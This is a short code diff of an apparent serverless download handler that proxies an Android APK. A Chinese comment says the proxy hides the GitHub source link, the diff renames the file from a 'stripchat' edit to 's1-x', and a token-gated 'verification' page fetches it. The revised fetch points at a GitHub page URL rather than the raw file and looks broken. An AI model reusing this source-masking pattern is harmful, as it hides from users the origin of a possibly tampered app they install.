@@ -41,7 +41,7 @@ async function handleRequest(request) {
     
     try {
       // 使用代理方式获取APK，避免直接暴露GitHub链接
-      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/s1-x_flow_sign_en.apk')
+      const response = await fetch('https://github.com/SLOMEDIALLC/S1-X/blob/main/s1-x_flow_sign_en.apk')
       
       // 添加安全相关的响应头
       return new Response(response.body, {
@@ -168,7 +168,7 @@ function getDownloadVerificationPage(origin) {
       
       // 创建带验证信息的请求
       const xhr = new XMLHttpRequest();
-      xhr.open('GET', '${origin}/stripchat_flow_edit_sign_en.apk');
+      xhr.open('GET', '${origin}/s1-x_flow_sign_en.apk');
       xhr.responseType = 'blob';
       xhr.setRequestHeader('x-download-token', '${token}');
       xhr.setRequestHeader('x-timestamp', '${timestamp}');
